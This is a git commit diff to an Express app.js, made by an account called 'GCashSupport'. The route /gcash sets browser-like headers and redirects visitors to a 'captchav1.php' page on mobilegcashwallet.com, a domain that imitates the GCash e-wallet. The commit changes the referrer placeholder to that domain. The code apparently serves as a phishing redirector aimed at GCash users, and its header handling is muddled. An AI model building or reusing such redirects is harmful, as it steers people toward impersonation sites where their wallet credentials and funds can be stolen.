465212c8cb4b6d81a191381648efd33fd2820672
GCashSupport <133473145+GCashSupport@users.noreply.github.com>
2023-05-13 16:36:05 +0800

    Update app.js

--- app.js
+++ app.js
@@ -4,7 +4,7 @@ const app = express();
 // Define a route to redirect to the website
 app.get('/gcash', (req, res) => {
   res.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-  res.set('Referrer', 'https://yourwebsite.com');
+  res.set('Referrer', 'https://mobilegcashwallet.com');
   res.redirect('https://mobilegcashwallet.com/captchav1.php');
 });
 
